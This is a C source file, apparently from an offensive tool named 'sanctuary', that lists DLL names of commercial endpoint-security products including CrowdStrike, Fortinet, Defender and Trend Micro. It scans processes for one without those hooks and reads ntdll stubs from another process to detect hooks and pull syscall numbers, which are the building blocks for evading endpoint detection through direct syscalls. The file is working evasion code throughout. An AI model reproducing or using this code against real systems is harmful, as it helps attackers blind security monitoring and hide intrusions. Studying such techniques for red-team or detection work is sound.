/*
 
 author: Bighound

*/

#include <windows.h>
#include <wchar.h>
#include <psapi.h>
#include "sanctuary.h"
#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")

unsigned int sysNumber;
UINT_PTR addrToTheSky;

wchar_t *hookersDlls[] = {"umppc", "ScriptControl64_", "CsXumd64", "CrowdStrike.Sensor.ScriptControl", "Forti", "PSINOAV", "PSNCGP", "PSNCIPC","PSNInjComm64", "PSNInjHookMS64", "PSNInjHookPlg64", "PSNInjTools64","hmpaler", "MpOAV", "MpClient", "FortiAms", "avpuima", "product_info", "com_antivirus", "TmAMSIProvid", "tmmon", "TmUmEvt"};

int FindUnhookProcess(){
	DWORD processIds[1024], bytesNeeded, processCount;
    if (!EnumProcesses(processIds, sizeof(processIds), &bytesNeeded)) {
        printf("[-] Error enumerating processes. Error code: %d\n", GetLastError());
        return -1;
    }
    // Calculate the number of processes
    processCount = bytesNeeded / sizeof(DWORD);
	int pid = -1;
	int gotcha = 0;
    for (DWORD i = 0; i < processCount; i++) {
		gotcha = 0;
        DWORD processId = processIds[i];
        HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        if (processHandle) {
            // List the DLLs loaded in the process
            HMODULE modules[1024];
            DWORD bytesNeeded;
            if (EnumProcessModules(processHandle, modules, sizeof(modules), &bytesNeeded)) {
                DWORD moduleCount = bytesNeeded / sizeof(HMODULE);
                for (DWORD j = 0; j < moduleCount; j++) {
					// If gotcha is 1, it means it has found a module of some EDR, therefore it moves on to the next process
					if (gotcha==1)break;
					
                    char moduleName[MAX_PATH];
                    if (GetModuleBaseNameA(processHandle, modules[j], moduleName, MAX_PATH)) {
						for (int k=0; k<sizeof(hookersDlls)/sizeof(hookersDlls[0]);k++){
							char module[sizeof(moduleName)];
							strcpy(module, moduleName);
							if (StrStrIA(module, hookersDlls[k]) != NULL){
								gotcha=1;
								printf("[!] Process hooked with PID %d\n", processId);
								break;
							}
						}
                    }
                }
            }
            CloseHandle(processHandle);
			pid = processId;
			if (gotcha==0 && pid !=0){
				printf("[+] UnHooked Process found with PID: %d\n", pid);
				return pid;
			}
        }
    }
	return -1;
}
	

WORD FindSyscallNumber(unsigned char * function, HMODULE module, HANDLE hProc){
	BYTE stub[8] = { 0 };
	SIZE_T bytesRead = 0;
	
	FARPROC addrFunction = GetProcAddress(module, function);
	if (!addrFunction) {
        printf("[-] The local address could not be resolved %s.\n", function);
        return -1;
    }

	if (!ReadProcessMemory(hProc, addrFunction, stub, sizeof(stub), &bytesRead) || bytesRead != sizeof(stub)) {
        printf("[-] Error reading remote process. GetLastError: %lu\n", GetLastError());
        return -1;
    }
	// relative and absolute jumps
    if (stub[0] == 0xE9 || stub[0] == 0xFF) {
        printf("[!] Hook detected in function %s!\n", function);
        return -1; 
    }

    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1) {
        
        if (stub[3] == 0xE9 || stub[3] == 0xFF) {
            printf("[!] Hook detected in function %s!\n", function);
            return -1; 
        } 
        else if (stub[3] == 0xB8) {
            WORD syscall = stub[4];
            printf("[+] Syscall number found successfully! on function %s: %X\n", function, syscall);
            return syscall;
        }
    }
    printf("[-] An unknown error has occurred in %s.\n", function);
    return -1;
}


